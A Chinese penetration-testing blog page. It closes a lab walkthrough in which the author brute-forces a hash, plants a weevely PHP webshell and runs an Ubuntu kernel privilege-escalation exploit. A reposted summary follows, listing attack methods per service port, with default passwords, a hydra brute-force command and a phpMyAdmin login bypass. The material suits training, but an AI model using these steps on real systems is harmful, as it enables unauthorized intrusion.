-<h4 id="第六步、后台反弹getshell"><a href="#第六步、后台反弹getshell" class="headerlink" title="第六步、后台反弹getshell"></a>第六步、后台反弹getshell</h4><p>我们首先利用使用john爆破hash值：snoopy</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215130350.png" alt=""></p>
-<p>使用dirsearch扫出后台文件</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215133942.png" alt=""></p>
-<p>进入后台登录页面并登录</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215134103.png" alt=""></p>
-<p>选择Templates模板，选择templates第一个模板即可，</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215134629.png" alt=""></p>
-<p>用weevely生成php后门文件.</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215142748.png" alt=""></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215142836.png" alt=""></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215144846.png" alt=""></p>
-<p>复制代码新建webshell.php文件，粘贴代码，保存</p>
-<p>然后用weevely连，成功拿到shell.</p>
-<h4 id="第七步、提权"><a href="#第七步、提权" class="headerlink" title="第七步、提权"></a>第七步、提权</h4><p>​    使用uname命令可知系统内核</p>
-<p>Ubuntu 16.04，我们可以尝试使用kali自带的earchsploit工具查找Ubuntu 16.04的提权漏洞。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215145305.png" alt=""></p>
-<p>我们将这个漏洞的详细文件复制到root根目录下，然后查看</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200218161711.png" alt=""></p>
-<p>我们将exp下载下来然后经过一系列的解压后</p>
-<pre><code>unzip 39772.zip 
-
-cd 39772
-
-tar -xvf exploit.tar  
-
-cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
-<p>​                ./doubleput</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200218161152.png" alt=""></p>
-<p>但是不知道为什么一直没法成功。。。。。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/duan-kou-shen-tou-zong-jie/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/12/duan-kou-shen-tou-zong-jie/" itemprop="url">端口渗透总结</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T23:02:08+08:00">
-                2020-03-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><strong>转载自：</strong><a href="https://www.shangmayuan.com/a/5536cbdf4f7b417da40a35fa.html" target="_blank" rel="noopener">https://www.shangmayuan.com/a/5536cbdf4f7b417da40a35fa.html</a></p>
-<h2 id="端口渗透总结"><a href="#端口渗透总结" class="headerlink" title="端口渗透总结"></a>端口渗透总结</h2><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>口渗透过程中我们需要关注几个问题：</p>
-<p>1、 端口的banner信息</p>
-<p>2、 端口上运行的服务</p>
-<p>3、 常见应用的默认端口</p>
-<p>当然对于上面这些信息的获取，我们有各式各样的方法，最为常见的应该就是nmap了吧！我们也可以结合其他的端口扫描工具，比如专门的3389、1433等等的端口扫描工具；</p>
-<h4 id="服务默认端口"><a href="#服务默认端口" class="headerlink" title="服务默认端口"></a>服务默认端口</h4><p>公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；</p>
-<p>注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；</p>
-<p>动态/私有：49152-65535，不为服务分配这些端口；</p>
-<p>当然这些端口都可以通过修改来达到欺骗攻击者的目的，但是这就安全了吗？攻击者又可以使用什么攻击方式来攻击这些端口呢？</p>
-<p>还需要注明的一点是：很多木马工具也有特定的端口</p>
-<h3 id="文件共享服务端口渗透"><a href="#文件共享服务端口渗透" class="headerlink" title="文件共享服务端口渗透"></a>文件共享服务端口渗透</h3><h5 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h5><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p>
-<p>默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p>
-<p>攻击方式：</p>
-<p>爆破：ftp的爆破工具有很多，这里我推荐owasp的<a href="https://sourceforge.net/projects/worawita/" target="_blank" rel="noopener">Bruter</a> 以及msf中ftp爆破模块；</p>
-<p>匿名访问：用户名：anonymous 密码：为空或任意邮箱</p>
-<p>用户名：FTP      密码：FTP或为空</p>
-<p>用户名：USET     密码：pass</p>
-<p>当然还有不需要用户名密码直接访问的，一般出现在局域网中；</p>
-<p>嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</p>
-<p>后门技术：在linux的vsftp某一版本中，存在着一个后门程序，只要在用户名后面加上 就会在6200上打开一个监听Shell，我们可以使用telnet直接连接；详细<a href="http://www.freebuf.com/articles/system/34571.html" target="_blank" rel="noopener">请点击</a></p>
-<p>远程溢出漏洞：6.10.1 IIS FTP远程溢出漏洞，在IIS FTP服务器中NLST命令存在一个缓冲区溢出漏洞，这个漏洞可能是攻击者在服务器运行一条非法命令。</p>
-<p>跳转攻击：（Bounce Attacks）攻击者发送一个FTP”PORT”命令给目标FTP服务器，其中包含该主机的网络地址和被攻击的服务的端口号。这样，客户端就能命令FTP服务器发一个文件给被攻击的服务。这个文件可能包括根被攻击的服务有关的命令（如SMTP,NNTP等）。由于是命令第三方去连接到一种服务，而不是直接连接，就使得跟踪攻击者变得困难，并且还避开了基于网络地址的访问限制。</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0116499" target="_blank" rel="noopener">山东电信Serv-U Web客户端弱口令</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0102552" target="_blank" rel="noopener">长虹ftp弱口令导致全网数据泄漏</a></p>
-<h5 id="NFS服务"><a href="#NFS服务" class="headerlink" title="NFS服务"></a>NFS服务</h5><p>nfs：网络文件系统，允许网络中的计算机通过TCP/IP网络共享资源。基于Linux系统，配置方面很简单，详细配置请参考案例分享。在nfs配置中，有不做任何限制的，有限制用户，有限制IP，以及在版本2.x中我们还可以使用证书来验证用户。当然不同的限制可以采用的攻击方式也不一样；就目前而言网上关于nfs的攻击还是比较少的!</p>
-<p>默认端口：2049</p>
-<p>攻击方式：</p>
-<p>未授权访问：未限制IP以及用户权限设置错误</p>
-<p>案例分享：</p>
-<p><a href="http://drops.wooyun.org/tips/8659" target="_blank" rel="noopener">Nfs配置不当导致被入侵</a></p>
-<p><a href="http://www.360doc.com/content/11/0410/14/2054285_108598426.shtml" target="_blank" rel="noopener">NFS服务全攻略</a></p>
-<h5 id="Samba服务"><a href="#Samba服务" class="headerlink" title="Samba服务"></a>Samba服务</h5><p>Samba服务：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。</p>
-<p>默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令（爆破工具采用hydra）hydra -l username -P<br>PassFile IP smb</p>
-<p>未授权访问：给予public用户高权限</p>
-<p>远程代码执行漏洞：CVE-2015-0240等等</p>
-<p>案例分享：</p>
-<p><a href="http://www.secpulse.com/archives/5975.html" target="_blank" rel="noopener">Samba远程代码执行漏洞</a></p>
-<p><a href="http://tech.soft6.com/667/10/45861.html" target="_blank" rel="noopener">未授权访问文件系统漏洞</a></p>
-<h5 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h5><p>ldap：轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。</p>
-<p>默认端口：389</p>
-<p>攻击方式：</p>
-<p>注入攻击：盲注</p>
-<p>未授权访问：</p>
-<p>爆破：弱口令</p>
-<p>案例分享：</p>
-<p><a href="http://drops.wooyun.org/tips/967" target="_blank" rel="noopener">LDAP注入与防御剖析</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-051234" target="_blank" rel="noopener">欧朋LDAP服务匿名访问</a></p>
-<p><a href="http://drops.wooyun.org/pentesting/2125" target="_blank" rel="noopener">使用LDAP查询快速提升域权限</a></p>
-<h4 id="远程连接服务端口渗透"><a href="#远程连接服务端口渗透" class="headerlink" title="远程连接服务端口渗透"></a>远程连接服务端口渗透</h4><h5 id="SSH服务"><a href="#SSH服务" class="headerlink" title="SSH服务"></a>SSH服务</h5><p>SSH服务：这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。</p>
-<p>默认端口：22</p>
-<p>攻击方式</p>
-<p>爆破：弱口令、</p>
-<p>漏洞：28退格漏洞、OpenSSL漏洞</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0135530" target="_blank" rel="noopener">安宇创新科技ssh弱口令</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0154829" target="_blank" rel="noopener">宜信贷某站存在OpenSSL漏洞</a></p>
-<h5 id="Telnet服务"><a href="#Telnet服务" class="headerlink" title="Telnet服务"></a>Telnet服务</h5><p>Telnet服务：在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；</p>
-<p>默认端口：23</p>
-<p>攻击方式</p>
-<p>爆破：弱口令</p>
-<p>嗅探：此种情况一般发生在局域网；</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0162704" target="_blank" rel="noopener">大量惠普打印机远程telnet可被查看和操作</a></p>
-<h5 id="Windows远程连接"><a href="#Windows远程连接" class="headerlink" title="Windows远程连接"></a>Windows远程连接</h5><p>​    远程桌面连接：作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；</p>
-<p>默认端口：3389</p>
-<p>攻击方式：</p>
-<p>爆破：3389端口爆破工具就有点多了</p>
-<p>Shift粘滞键后门：5次shift后门</p>
-<p>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机；</p>
-<h5 id="VNC服务"><a href="#VNC服务" class="headerlink" title="VNC服务"></a>VNC服务</h5><p>VNC：一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也</p>
-<p>默认端口：5900+桌面ID（5901；5902）</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令</p>
-<p>认证口令绕过：</p>
-<p>拒绝服务攻击：（<a href="http://drops.wooyun.org/papers/9014" target="_blank" rel="noopener">CVE-2015-5239</a>）</p>
-<p>权限提升：（CVE-2013-6886）</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0143044" target="_blank" rel="noopener">广西电信客服服务器使用VNC存在弱口令可直接控制</a></p>
-<h5 id="Pcanywhere服务"><a href="#Pcanywhere服务" class="headerlink" title="Pcanywhere服务"></a>Pcanywhere服务</h5><p>​        PyAnywhere服务：一款远控工具，有点类似vnc的功能；这个服务在以前很多黑客发的视频里面都有，利用pcanywhere来进行提权；</p>
-<p>默认端口：5632</p>
-<p>攻击方式：</p>
-<p>提权控制服务：</p>
-<p>拒绝服务攻击：</p>
-<p>代码执行：<a href="https://www.seebug.org/vuldb/ssvid-30050" target="_blank" rel="noopener">请参考</a></p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2013-034519/" target="_blank" rel="noopener">黑龙江物价局多处安全漏洞可能导致服务器沦陷(pcAnywhere提权+密码突破)</a></p>
-<h3 id="Web应用服务端口渗透"><a href="#Web应用服务端口渗透" class="headerlink" title="Web应用服务端口渗透"></a>Web应用服务端口渗透</h3><p>​    HTTP服务：对于http服务其实是我们目前这几年比较常见的攻击入口，所以这里会针对http服务进行一个详细的详解；</p>
-<p>注：这个板块的所有攻击方式，如果涉及到常规的web漏洞不会提出来，除非是特定的服务器才会产生的漏洞；</p>
-<h5 id="IIS服务"><a href="#IIS服务" class="headerlink" title="IIS服务"></a>IIS服务</h5><p>默认端口：80/81/443</p>
-<p>攻击方式：</p>
-<p>IIS<br>PUT写文件：利用IIS漏洞，put方法直接将文件放置到服务器上</p>
-<p>短文件名泄漏：这种一般没啥影响</p>
-<p>解析漏洞：详细见apache服务</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-047134" target="_blank" rel="noopener">徐州市教育系统大量IIS PUT漏洞</a></p>
-<p><a href="http://www.wooyun.org/bug.php?action=view&id=27365" target="_blank" rel="noopener">用友软件IIS写权限(PUT)导致可获取webshell控制服务器</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-093865" target="_blank" rel="noopener">国家电网某分站存在iis短文件名漏洞</a></p>
-<h5 id="Apache-Tomcat-Nginx-Axis2"><a href="#Apache-Tomcat-Nginx-Axis2" class="headerlink" title="Apache/Tomcat/Nginx/Axis2"></a>Apache/Tomcat/Nginx/Axis2</h5><p>默认端口：80/8080</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令（爆破manager后台）</p>
-<p>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响；</p>
-<p>解析漏洞：<a href="http://drops.wooyun.org/papers/539" target="_blank" rel="noopener">请参考</a></p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2013-018433" target="_blank" rel="noopener">安卓开发平台存在上传漏洞和Apache解析漏洞,成功获取webshell</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-06947" target="_blank" rel="noopener">腾讯分站 Apache 漏洞</a></p>
-<h5 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h5><p>默认端口：7001</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令 4组：用户名密码均一致：system weblogic（密码可能weblogic123） portaladmin guest</p>
-<p>Congsole后台部署webshell：</p>
-<p>Java反序列化：</p>
-<p>泄漏源代码/列目录：这个太老了，估计网上都没有了吧！</p>
-<p>SSRF窥探内网：<a href="http://www.wooyun.org/bugs/wooyun-2015-0136698" target="_blank" rel="noopener">央视网SSRF可窥探内网</a></p>
-<p>案列分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-038214" target="_blank" rel="noopener">福建省人力资源和社会保障厅下属某WEBLOGIC弱口令</a></p>
-<p><a href="http://drops.wooyun.org/tips/8321" target="_blank" rel="noopener">利用Weblogic进行入侵的一些总结</a></p>
-<h5 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h5><p>默认端口8080；其他端口1098/1099/4444/4445/8080/8009/8083/8093</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令（爆破jboss系统后台）</p>
-<p>远程代码执行：<a href="http://www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html" target="_blank" rel="noopener">由于配置不当造成</a></p>
-<p>Java反序列化：</p>
-<p>案例分享</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-07409" target="_blank" rel="noopener">中华人民共和国民政部JBoss配置不当</a></p>
-<p><a href="http://drops.wooyun.org/papers/178" target="_blank" rel="noopener">JBOSS安全问题总结</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0110279" target="_blank" rel="noopener">中国科学院某处jboss应用漏洞</a></p>
-<h5 id="Websphere"><a href="#Websphere" class="headerlink" title="Websphere"></a>Websphere</h5><p>默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令（控制台）</p>
-<p>任意文件泄漏：（CVE-2014-0823）</p>
-<p>Java反序列化</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-036803" target="_blank" rel="noopener">中国电信某通用型业务系统(Websphere)GetShell漏洞</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0167244" target="_blank" rel="noopener">大汉网络有限公司远程命令执行漏洞(WebSphere案例)</a></p>
-<h5 id="GlassFish"><a href="#GlassFish" class="headerlink" title="GlassFish"></a>GlassFish</h5><p>默认端口：http 8080；IIOP 3700；控制台4848</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令（对于控制台）</p>
-<p>任意文件读取：</p>
-<p>认证绕过：</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0144595/" target="_blank" rel="noopener">应用服务器glassfish存在通用任意文件读取漏洞</a></p>
-<p><a href="http://www.tuicool.com/articles/ZRJriy" target="_blank" rel="noopener">Oracle GlassFish Server认证绕过</a></p>
-<h5 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h5><p>默认端口：8080、8089</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令（默认管理员）</p>
-<p>未授权访问：</p>
-<p>反序列化：</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2014-062541" target="_blank" rel="noopener">酷6Jenkins系统未授权访问可执行系统命令</a></p>
-<h5 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h5><p>默认端口：8080</p>
-<p>攻击方式：</p>
-<p>目录遍历</p>
-<p>远程文件读取</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-017200" target="_blank" rel="noopener">爱奇艺Resin配置漏洞</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0126353" target="_blank" rel="noopener">Resin漏洞利用案例之目录遍历/以金蝶某系统为例</a></p>
-<h5 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h5><p> 默认端口：8080</p>
-<p> 攻击方式：</p>
-<p>远程共享缓冲区溢出</p>
-<h5 id="Lotus"><a href="#Lotus" class="headerlink" title="Lotus"></a>Lotus</h5><p>影响的都是一些大型的企业，特别需要注意，经过以前的测试发现弱口令这个问题经常都存在，可能是很多管理员不知道如何去修改（不要打我）。</p>
-<p>默认端口：1352</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令（admin password）控制台</p>
-<p>信息泄露</p>
-<p>跨站脚本攻击</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-053881" target="_blank" rel="noopener">Lotus Domino WebMail一处越权访问</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0134024" target="_blank" rel="noopener">中电投集团某系统弱口令直达内网涉及/OA系统/内部邮箱/财务系统/人力资源系统</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0109008" target="_blank" rel="noopener">中国某大型金融机构地方业务弱口令导致数万商户信息泄露&amp;访问Lotus Domino后台</a></p>
-<h4 id="数据库服务端口渗透"><a href="#数据库服务端口渗透" class="headerlink" title="数据库服务端口渗透"></a>数据库服务端口渗透</h4><p>针对所有的数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。</p>
-<h5 id="MYSQL数据库"><a href="#MYSQL数据库" class="headerlink" title="MYSQL数据库"></a>MYSQL数据库</h5><p>默认端口：3306</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令</p>
-<p>身份认证漏洞：<a href="http://www.freebuf.com/vuls/3815.html" target="_blank" rel="noopener">CVE-2012-2122</a></p>
-<p>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</p>
-<p>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意</p>
-<p>案例分享：</p>
-<p><a href="https://www.seebug.org/appdir/MySQL" target="_blank" rel="noopener">漏洞分享</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0115534/" target="_blank" rel="noopener">和讯网某站点存在mysql注入漏洞</a></p>
-<p><a href="http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390" target="_blank" rel="noopener">MySQL提权总结</a></p>
-<h5 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h5><p>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令/使用系统用户</p>
-<p>案例分享：</p>
-<p><a href="http://drops.wooyun.org/tips/1620" target="_blank" rel="noopener">MSSQL注射总结</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0102404" target="_blank" rel="noopener">上海安脉综合管理系统mssql注射漏洞</a></p>
-<p><a href="http://drops.wooyun.org/tips/1067" target="_blank" rel="noopener">解密MSSQL连接数据库密码</a></p>
-<p><a href="http://www.freebuf.com/articles/database/22997.html" target="_blank" rel="noopener">从攻击MSSQL到提权</a>: 使用msf针对mssql的一次完整渗透</p>
-<h5 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h5><p>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令</p>
-<p>注入攻击；</p>
-<p>漏洞攻击；</p>
-<p>案例分享：</p>
-<p><a href="http://drops.wooyun.org/papers/6035" target="_blank" rel="noopener">Oracle盲注结合XXE漏洞远程获取数据</a></p>
-<h5 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h5><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；<a href="http://lcx.cc/?i=1275" target="_blank" rel="noopener">浅谈postgresql数据库攻击技术</a> 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
-<p>默认端口：5432</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令：postgres postgres</p>
-<p>缓冲区溢出：CVE-2014-2669</p>
-<p>案例分享：</p>
-<p><a href="http://drops.wooyun.org/tips/6449" target="_blank" rel="noopener">Hacking postgresql</a></p>
-<p><a href="http://zone.wooyun.org/content/4971" target="_blank" rel="noopener">关于postgresql的那些事</a></p>
-<h5 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h5><p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：<a href="http://drops.wooyun.org/运维安全/2470" target="_blank" rel="noopener">请参考</a></p>
-<p>默认端口：27017</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令</p>
-<p>未授权访问；github有攻击代码；<a href="https://github.com/yangbh/Hammer/blob/master/plugins/System/mongodb_unauth_access.py" target="_blank" rel="noopener">请点击</a></p>
-<p>案例分享：</p>
-<p><a href="http://bobao.360.cn/learning/detail/274.html" target="_blank" rel="noopener">MongoDB phpMoAdmin远程代码执行</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2013-047153" target="_blank" rel="noopener">搜狐MongoDB未授权访问</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2014-066883" target="_blank" rel="noopener">新浪微米未授权访问</a></p>
-<p><a href="http://drops.wooyun.org/运维安全/2470" target="_blank" rel="noopener">解决MongoDB各种隐患问题</a></p>
-<h5 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h5><p>redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。Exp：<a href="https://yunpan.cn/cYjzHxawFpyVt" target="_blank" rel="noopener">https://yunpan.cn/cYjzHxawFpyVt</a> 访问密码 e547</p>
-<p>默认端口：6379</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令</p>
-<p>未授权访问+配合ssh key提权；</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0152710/" target="_blank" rel="noopener">中国铁建网redis+ssh-keygen免认证登录</a></p>
-<h5 id="SysBase数据库"><a href="#SysBase数据库" class="headerlink" title="SysBase数据库"></a>SysBase数据库</h5><p>默认端口：服务端口5000；监听端口4100；备份端口：4200</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令</p>
-<p>命令注入：</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-083132" target="_blank" rel="noopener">广西自考信息系统Sybase数据库注入</a></p>
-<p><a href="http://www.venustech.com.cn/NewsInfo/124/22061.Html" target="_blank" rel="noopener">Sybase EAServer命令注入漏洞</a></p>
-<h5 id="DB2数据库"><a href="#DB2数据库" class="headerlink" title="DB2数据库"></a>DB2数据库</h5><p>默认端口：5000</p>
-<p>攻击方式：</p>
-<p>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0113071" target="_blank" rel="noopener">哈尔滨银行主站DB2注入</a></p>
-<p>总结一下：对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的 数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据 库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！</p>
-<p>顺便提一下：很多时候银行企业采用的都是oracle、db2等大型数据库；</p>
-<h3 id="邮件服务端口渗透"><a href="#邮件服务端口渗透" class="headerlink" title="邮件服务端口渗透"></a>邮件服务端口渗透</h3><h5 id="SMTP协议"><a href="#SMTP协议" class="headerlink" title="SMTP协议"></a>SMTP协议</h5><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p>
-<p>默认端口：25（smtp）、465（smtps）</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令</p>
-<p>未授权访问</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-025810" target="_blank" rel="noopener">腾讯邮箱smtp注册时间限制绕过漏洞</a></p>
-<p><a href="http://drops.wooyun.org/papers/534" target="_blank" rel="noopener">邮件伪造详解</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2011-03388" target="_blank" rel="noopener">qq邮箱伪造发件地址，容易被钓鱼利用</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2010-098813" target="_blank" rel="noopener">众多厂商邮件系统配置不当可伪造邮件人</a></p>
-<h5 id="POP3协议"><a href="#POP3协议" class="headerlink" title="POP3协议"></a>POP3协议</h5><p>默认端口：109（POP2）、110（POP3）、995（POP3S）</p>
-<p>攻击方式：</p>
-<p>爆破；弱口令</p>
-<p>未授权访问；</p>
-<p>案例分享：</p>
-<p><a href="http://www.wooyun.org/bug.php?action=view&id=147087" target="_blank" rel="noopener">中国联通沃邮箱等部分Android客户端免密码登陆（可获取任意联通用户pop3密码）</a></p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2011-094877" target="_blank" rel="noopener">中航信邮箱密码泄漏及VPN账号和大量邮箱弱口令导致可内网漫游拿到域控</a></p>
-<h5 id="IMAP协议"><a href="#IMAP协议" class="headerlink" title="IMAP协议"></a>IMAP协议</h5><p>默认端口：143（imap）、993（imaps）</p>
-<p>攻击方式：</p>
-<p>爆破：弱口令</p>
-<p>配置不当</p>
-<p>案例分享：</p>
